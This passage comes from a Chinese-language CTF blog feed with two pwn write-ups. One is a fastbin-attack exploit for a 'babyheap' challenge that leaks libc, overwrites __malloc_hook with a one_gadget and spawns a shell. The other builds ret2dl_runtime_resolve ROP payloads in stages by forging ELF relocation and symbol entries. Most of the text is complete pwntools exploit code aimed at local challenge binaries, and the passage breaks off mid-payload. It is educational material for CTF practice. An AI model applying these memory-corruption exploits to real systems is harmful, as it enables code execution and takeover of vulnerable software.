hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬</span><br></pre></td></tr></table></figure><p>第二步就构造chunk，使one_gadget能写到mollac_hook的地址里，<br>0x80可以写下0x60的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//这里的size指用户区域，因此要小2倍SIZE_SZ</span><br><span class="line">Fastbins[idx=0, size=0x10]</span><br><span class="line">Fastbins[idx=1, size=0x20]</span><br><span class="line">Fastbins[idx=2, size=0x30]</span><br><span class="line">Fastbins[idx=3, size=0x40]</span><br><span class="line">Fastbins[idx=4, size=0x50]</span><br><span class="line">Fastbins[idx=5, size=0x60]</span><br><span class="line">Fastbins[idx=6, size=0x70]</span><br></pre></td></tr></table></figure><p>idx为5，则找7f，就开始提到的arbitrary alloc的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./babyheap&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fill(idx, size, content):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;Content: &apos;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dump(idx):</span><br><span class="line">    p.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x10)#0  00</span><br><span class="line">allocate(0x10)#1  20</span><br><span class="line">allocate(0x10)#2  40</span><br><span class="line">allocate(0x10)#3  60</span><br><span class="line">allocate(0x80)#4  80</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80)</span><br><span class="line">fill(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x10)#1</span><br><span class="line">allocate(0x10)#2 -&gt;4</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)</span><br><span class="line">fill(3,len(payload),payload)</span><br><span class="line"># gdb.attach(p)</span><br><span class="line">allocate(0x80)#5</span><br><span class="line">free(4)</span><br><span class="line">dump(2)#overlap</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">main_arena = u64(p.recv(8))-0x58</span><br><span class="line"></span><br><span class="line">print hex(main_arena)</span><br><span class="line">print hex(libc.sym[&apos;__libc_start_main&apos;])</span><br><span class="line"></span><br><span class="line">libc_base = main_arena - 0x3C4B20</span><br><span class="line">#0x7F50FB4A9000‬  </span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">target = main_arena - 0x33 </span><br><span class="line">addr = p64(target)</span><br><span class="line">fill(2,len(addr),addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">allocate(0x60)#4</span><br><span class="line">allocate(0x60)#target 6</span><br><span class="line"></span><br><span class="line">onegadget = libc_base + 0x4526a</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(onegadget)</span><br><span class="line">fill(6,len(payload),payload)</span><br><span class="line"></span><br><span class="line">allocate(0x100)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接：<br>        <a href="https://bbs.pediy.com/thread-247214.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247214.htm</a><br>        <a href="https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/" target="_blank" rel="noopener">https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/</a><br>        <a href="https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看" target="_blank" rel="noopener">https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看</a>)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒&lt;br&gt;好了，废话不多说，开始吧&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn知识点" scheme="https://c0yo7e.github.io/tags/pwn%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>runtime_resolve</title>
    <link href="https://c0yo7e.github.io/2019/10/07/runtime-resolve/"/>
    <id>https://c0yo7e.github.io/2019/10/07/runtime-resolve/</id>
    <published>2019-10-07T04:23:05.000Z</published>
    <updated>2020-08-02T05:13:21.493Z</updated>
    
    <content type="html"><![CDATA[<p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p><p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p><a id="more"></a><p>对于此类题目：<br>关键点：</p><ol><li>.rel.plt表</li><li>.dynsym</li><li>.dynstr</li><li>从rel.plt里获得某个函数在.dynsym里的偏移</li><li>再从 .dynsym 里获得.dynstr里的偏移</li><li>在 .dynstr里找到对应的字符，将这个字符解析成函数</li></ol><p>然后贴一段我也没有理解的东西看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">符号版本信息</span><br><span class="line">    最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。</span><br><span class="line">重定位表项</span><br><span class="line">r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</span><br></pre></td></tr></table></figure><p>然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址）<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%871.png" alt></p><p>第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%872.png" alt></p><p>push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg）</p><p>然后跳到plt[0]  (0x8048380) 里，将linkmap  push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read  got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址)</p><p>关于四个关键函数的地址提取：<br>plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addr<br>rel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addr<br>dynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addr<br>dynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr</p><p>objdump -s -j .rel.plt babystack<br>objdump -d -j .plt babystack</p><p>（直接找ida来得更快一点）</p><p>readelf -S bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%873.png" alt></p><p>readelf -d bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%874.png" alt></p><p>JMPREL == .rel.plt<br>SYMTAB == .dynsym<br>STRREL == .dynstr<br>plt貌似只有-S里能找到</p><p>readelf -r bof<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%875.png" alt></p><p>607 -&gt; write的.rel.plt  607&lt;&lt;8 –&gt; 6<br>x/4wx .dynsym的地址+0x10*6    第一个参数是在str里的偏移<br>x/s .str的地址+上面的偏移      得到的是函数名的字符串<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%876.png" alt><br>x/3i  要查函数的plt表地址<br><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%877.png" alt>    </p><p>Jmp –&gt; got表地址<br>Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）<br>Jmp –&gt; plt[0]的地址</p><p>再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中<br>GOT<a href="GOT+8">2</a>是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址</p><p>_dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write</p><p>漏洞利用方式：<br>1、控制eip为plt[0]的地址，只需传入一个index_arg参数即可<br>2、控制index_arg的大小，使reloc的信息存入可控地址<br>3、伪造reloc内容，使sym在可控地址<br>4、伪造sym内容，是name在可控地址<br>5、伪造name为任意库函数，达到我们想要的效果</p><p>我们来分步完成我们想要的效果吧（有write的函数其实就不需要这个方法了吧…）</p><p>Part1：<br>直接用write函数，查看最后输出效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./bof&apos;)</span><br><span class="line">elf = ELF(&apos;./bof&apos;)</span><br><span class="line"></span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line"></span><br><span class="line">leave_ret = 0x08048458</span><br><span class="line">pop_ebp = 0x0804861b  </span><br><span class="line">ppp_ret = 0x08048619   #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">bss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_stage + 36  </span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) </span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10  </span><br><span class="line">r_info = index_dynsym &lt;&lt; 8 | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)  </span><br><span class="line">st_name = fake_sym_addr + 0x10 - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#stage 1   bss_addr</span><br><span class="line">payload = &quot;a&quot;*112 </span><br><span class="line">payload += p32(read_plt) # 读100个字节到base_stage</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(0)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(100)</span><br><span class="line">payload += p32(pop_ebp) # 把base_stage pop到ebp中</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stage</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line"></span><br><span class="line">payload1 = &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(write_plt)</span><br><span class="line">payload1 += &apos;aaaa&apos;</span><br><span class="line">payload1 += p32(1)</span><br><span class="line">payload1 += p32(base_stage+80)</span><br><span class="line">payload1 += p32(len(cmd))</span><br><span class="line">payload1 += &apos;A&apos; * (80 - len(payload1))</span><br><span class="line">payload1 += cmd</span><br><span class="line">payload1 += &apos;A&apos; * (100 - len(payload1))</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>“/bin/sh“被打出来了</p><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%878.png" alt></p><p>Part 2<br>控制eip为pit[0]地址 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380  # objdump -d -j .plt bof</span><br><span class="line">index_offset = 0x20  # write&apos;s index</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%879.png" alt></p><p>Part 3<br>控制index_offset 指向fake_reloc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380 # objdump -d -j .plt bof</span><br><span class="line">rel_plt = 0x08048330 # objdump -s -j .rel.plt bof</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">r_info = 0x607 # write: Elf32_Rel-&gt;r_info</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;aaaa&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8710.png" alt></p><p>Part 4<br>伪造fake_sym  指向st_name</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd = &quot;/bin/sh\x00&quot;</span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = 0x4c</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += &apos;AAAA&apos;</span><br><span class="line">payload2 += p32(1)</span><br><span class="line">payload2 += p32(base_stage + 80)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += fake_reloc # (base_stage+28)的位置</span><br><span class="line">payload2 += &apos;B&apos; * align</span><br><span class="line">payload2 += fake_sym # (base_stage+36)的位置</span><br><span class="line">payload2 += &apos;A&apos; * (80 - len(payload2))</span><br><span class="line">payload2 += cmd </span><br><span class="line">payload2 += &apos;A&apos; * (100 - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2019/10/07/runtime-resolve/%E5%9B%BE%E7%89%8711.png" alt></p><p>Part 5<br>St_name指向 ‘write’，继续回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">plt_0 = 0x08048380</span><br><span class="line">rel_plt = 0x08048330</span><br><span class="line">index_offset = (base_stage + 28) - rel_plt</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">dynsym = 0x080481d8</span><br><span class="line">dynstr = 0x08048278</span><br><span class="line">fake_sym_addr = base_stage + 36</span><br><span class="line">align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / 0x10</span><br><span class="line">r_info = (index_dynsym &lt;&lt; 8) | 0x7</span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10</span><br><span class="line">fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;AAAA&apos;</span><br><span class="line">payload2 += 